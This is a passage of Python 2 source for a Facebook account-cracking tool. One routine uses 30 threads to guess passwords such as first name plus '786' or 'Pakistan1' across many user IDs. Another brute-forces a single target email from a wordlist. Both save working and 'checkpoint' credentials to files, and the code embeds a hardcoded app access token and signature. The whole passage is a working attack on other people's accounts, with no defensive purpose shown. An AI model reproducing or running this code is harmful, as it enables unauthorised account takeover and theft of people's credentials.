                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            s = json.load(data)
                            if 'access_token' in s:
                                print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in s['error_msg']:
                                print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
                                cek = open('out/checkpoint.txt', 'k')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = y['first_name'] + '786'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                s = json.load(data)
                                if 'access_token' in s:
                                    print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in s['error_msg']:
                                    print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
                                    cek = open('out/checkpoint.txt', 'k')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Pakistan1'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    s = json.load(data)
                                    if 'access_token' in s:
                                        print '\x1b[1;92mRISHU-OK\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in s['error_msg']:
                                        print '\x1b[1;91mRISHU-CP\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
                                        cek = open('out/checkpoint.txt', 'k')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;91mProcess Has Been Completed \x1b[1;97m....'
    print '\x1b[1;91mTotal OK/\x1b[1;91mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;97m]')
    crack()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo14
        print '-----------------------------------------------------------'
        try:
            email = raw_input('\x1b[1;91mID\x1b[1;97m/\x1b[1;97mEmail \x1b[1;97mTarget \x1b[1;97m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;92mWordlist \x1b[1;97m(Type--> dvl.list) \x1b[1;97m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '------------------------------------------------------------'
            print '\x1b[1;97m[\x1b[1;97m\xe2\x9c\x93\x1b[1;97m] \x1b[1;91mTarget \x1b[1;97m:\x1b[1;97m ' + email
            time.sleep(0.05)
            print '\x1b[1;97mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[1;93mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;97m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;97m] \x1b[1;97mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' \xe2\x97\x8f ' + pw + '\n')
                        dapat.close()
                        print '\x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\x1b[1;92mFounded.'
                        print '--------------------------------------------------'
                        print '\x1b[1;91m[!] \x1b[1;91mAccount Maybe Checkpoint'
                        time.sleep(0.05)
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                        time.sleep(0.05)
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print '\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect '
            super()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m[?] \x1b[1;93mToken\x1b[1;92m : Enter Acces Token Here :- ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong'
        e = raw_input('\x1b[1;97m[?] \x1b[1;97mToken Invalid Refresh Page\x1b[1;97m[y/n]: ')
        if e == '':
            keluar()
        elif e == 'y':
            login()
        else:
            keluar()


def get(data):
    print 'Generate access token '
    try:
        os.mkdir('cookie')
    except OSError:
        pass

    b = open('cookie/token.log', 'w')
    try:
        r = requests.get('https://api.facebook.com/restserver.php', params=data)
        a = json.loads(r.text)
        b.write(a['access_token'])
        b.close()
        print 'successfully generate access token'
        print 'Your access token is stored in cookie/token.log'
        menu()
    except KeyError:
        print 'Failed to generate access token'
        print 'Check your connection / email or password'
        os.remove('cookie/token.log')
        menu()
    except requests.exceptions.ConnectionError:
        print 'Failed to generate access token'
        print 'Connection error !!!'
        os.remove('cookie/token.log')
        menu()


if __name__ == '__main__':
    login() 
